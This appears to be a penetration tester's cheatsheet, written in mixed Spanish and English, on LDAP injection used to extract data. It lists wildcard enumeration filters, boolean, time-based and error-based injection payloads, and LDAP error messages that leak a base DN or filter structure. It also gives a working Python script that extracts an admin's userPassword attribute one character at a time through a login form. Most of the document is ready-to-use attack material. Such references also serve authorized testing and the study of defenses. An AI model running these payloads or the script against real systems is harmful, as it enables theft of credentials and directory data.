---
aliases:
  - LDAP Blind
  - LDAP Boolean Extraction
  - LDAP Time-based
tags:
  - type/cheatsheet
  - vuln/ldap-injection
  - technique/exfiltration
  - asset/web-app
  - asset/directory-service
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[LDAP Injection]]'
---
# LDAP Injection - Information Disclosure / Blind Extraction

***

## Wildcards para Enumeración

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `*` | Match all entries | Universal wildcard. |
| `a*` | Entries starting con `a` | Prefix enum. |
| `*z` | Entries ending con `z` | Suffix enum. |
| `*admin*` | Entries containing `admin` | Substring enum. |
| `(uid=*)` | All UIDs | Direct enum. |
| `(objectClass=*)` | All objects of any class | Universal. |
| `(objectClass=user)` | Solo users (AD) | Class filter. |
| `(objectClass=person)` | Solo persons | Same. |
| `(objectClass=group)` | Solo groups | AD groups. |
| `(memberOf=CN=Admins,...)` | All admins | Group enum. |
| `(&(objectClass=user)(samAccountName=admin*))` | Users con SAM starting `admin` | AD compound. |
| Wildcard en `mail` | `(mail=*@target.com)` | Domain enum. |
| Wildcard en `userPassword` | `(userPassword=*)` | Users con pass set (AD doesn't expose hash but OpenLDAP can). |
| Pagination | LDAP server can return paged | If atacante reads multiple pages. |
^ldap-disclosure-wildcards

___

## Boolean-Based Char-by-Char

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | Use OR filter para inferir char-by-char | Standard blind technique. |
| Test single char | `*)(uid=admin*` matches → admin existe? | Existence check. |
| Substring test | `*)(uid=a*` returns user? | First char = `a`. |
| Iterate chars | Loop `a-z 0-9 -` per position | Char enum. |
| Boolean indicator | Login success vs login failure | Difference observable. |
| Status code differential | 200 vs 401 vs 500 | Standard oracle. |
| Response length differential | Match vs no-match has different size | Sometimes more reliable. |
| Time differential | Match takes longer (or vice versa) | If load. |
| Char-by-char password attribute | `*)(userPassword=a*)` | If userPassword leakable. |
| `objectClass` enum | `*)(objectClass=a*)` | Schema discovery. |
| Group enumeration | `*)(memberOf=CN=a*)` | DN inference. |
| OID extraction | `*)(supportedControl=1.2.840.*` | Server feature flags. |
^ldap-disclosure-boolean

### Script Python boolean extraction

```python
import requests, string

URL = "https://target/login"
TARGET = "userPassword"
chars = string.ascii_lowercase + string.digits + "-_"

result = ""
while True:
    found = False
    for c in chars:
        payload = f"admin)({TARGET}={result}{c}*"
        r = requests.post(URL, data={"username": payload, "password": "x"})
        if "Welcome" in r.text:  # success indicator
            result += c
            print(f"[+] {result}")
            found = True
            break
    if not found:
        break

print(f"Final: {result}")
```

___

## Time-Based Oracle

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | Heavy filter expression delays response | Inferir char por timing. |
| Heavy expression | `(\|(cn=a)(cn=b)(cn=c)(cn=d)...(cn=z))` | Multi-OR para slowdown artificial. |
| Conditional heavy | If char match, run heavy filter | Standard time oracle. |
| LDAP server resource exhaustion | Long filters cause CPU usage | Sometimes 500 ms+ diff. |
| Pagination loop | Force pagination to enumerate | Natural delay. |
| Substring loop | Long substring extraction in single filter | Triggers expensive ops. |
| Wildcard subtree search | `(*=*)` con large subtree | Server scans all. |
| `objectClass=*` con base DN broad | Returns thousands → time-consuming | Network-bound delay. |
| Combine con sleep gadget en app | Backend uses LDAP filter to check + sleep on success | Indirect timing. |
| Real-time monitoring | Atacante monitorea response time per char | Statistical analysis. |
^ldap-disclosure-time

___

## Error-Based Leak

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | Error message contains LDAP filter or attribute value | Direct disclosure. |
| Force syntax error | `*)(invalid` | Filter syntax error reveals partial. |
| Type mismatch error | `(uid=NOT_A_NUMBER)` con int field | Sometimes error includes value. |
| Schema violation | Add unknown attribute | Error reveals schema info. |
| DN parse error | Malformed DN | Reveals base DN. |
| Authentication error verbose | "User not found" vs "Wrong password" | Username enumeration. |
| Search result error | Search retrieves data → error includes data | Edge case. |
| Stack trace en error page | Java/PHP/.NET stack trace con LDAP context | Disclosure. |
| Debug mode app | Verbose logs include filter execution | Dev mode. |
| LDAP referral error | Referral to other server reveals topology | Multi-DC. |
| `objectClass` enumeration via error | Iterating classes triggers different errors | Schema enum. |
^ldap-disclosure-error

### Common error patterns reveals info

```
LDAPException: [LDAP: error code 32 - 0000208D: NameErr: DSID-031001E5,
problem 2001 (NO_OBJECT), data 0, best match of:
  'DC=target,DC=com'
]
                                                              ↑
                                                              Reveals base DN
```

```
javax.naming.directory.InvalidSearchFilterException: 
Bad search filter at character: 12: (&(uid=*)(uid=*)
                                                ↑
                                                Reveals filter structure
```

***
